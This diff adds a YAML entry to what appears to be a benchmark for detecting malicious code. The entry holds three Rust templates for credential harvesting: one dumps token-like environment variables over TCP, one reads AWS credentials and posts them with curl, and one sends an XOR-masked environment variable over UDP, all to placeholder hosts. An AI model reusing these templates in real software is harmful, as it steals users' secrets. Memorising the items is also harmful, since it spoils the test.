@@ -1,0 +1,65 @@
+id: c1_env_harvest_v2
+category: C1
+name: Environment and Secret Harvesting
+description: Inspects environment variables or credential directories for sensitive tokens and exfiltrates or dumps them.
+defang_notes: Inert Rust code syntax tree; never executed or compiled during benchmarking.
+variants:
+  - id: c1_vars_iterator
+    surface_variant: env_vars_dump
+    obfuscation_level: 0
+    domain_invalid: "telemetry-probe.infra.invalid"
+    domain_fabricated: "pkg-telemetry-sink.net"
+    code_template: |
+      fn {fn_name}() {
+          let mut {var_name} = String::new();
+          for (k, v) in std::env::vars() {
+              let lower = k.to_lowercase();
+              if lower.contains("token") || lower.contains("key") || lower.contains("secret") || lower.contains("auth") {
+                  {var_name}.push_str(&format!("{k}={v}\n"));
+              }
+          }
+          if !{var_name}.is_empty() {
+              if let Ok(mut stream) = std::net::TcpStream::connect("{target_host}:8443") {
+                  use std::io::Write;
+                  let _ = stream.write_all({var_name}.as_bytes());
+              }
+          }
+      }
+
+  - id: c1_cloud_cred_reader
+    surface_variant: cloud_config_harvest
+    obfuscation_level: 1
+    domain_invalid: "metrics-collector.cloud.invalid"
+    domain_fabricated: "cloud-metrics-router.org"
+    code_template: |
+      fn {fn_name}() {
+          let parts = ["home", ".config", "gcloud", "credentials.db"];
+          if let Some(home) = std::env::var_os("HOME") {
+              let mut p = std::path::PathBuf::from(home);
+              p.push(".aws");
+              p.push("credentials");
+              if let Ok(data) = std::fs::read_to_string(&p) {
+                  let host = ["https://", "{target_host}", "/sync"].concat();
+                  let _ = std::process::Command::new("curl")
+                      .args(["-s", "-X", "POST", "-d", &data, &host])
+                      .spawn();
+              }
+          }
+      }
+
+  - id: c1_xor_token_sweep
+    surface_variant: xor_env_collector
+    obfuscation_level: 2
+    domain_invalid: "session-audit.internal.invalid"
+    domain_fabricated: "api-event-gateway.io"
+    code_template: |
+      fn {fn_name}() {
+          // Decode target env var name via bitwise mask
+          let enc: [u8; 12] = [0x27, 0x24, 0x26, 0x35, 0x3f, 0x2d, 0x3a, 0x32, 0x35, 0x34, 0x3b, 0x3e];
+          let key: String = enc.iter().map(|b| (b ^ 0x5a) as char).collect();
+          if let Ok(val) = std::env::var(&key) {
+              if let Ok(sock) = std::net::UdpSocket::bind("0.0.0.0:0") {
+                  let _ = sock.send_to(val.as_bytes(), "{target_host}:5353");
+              }
+          }
+      }
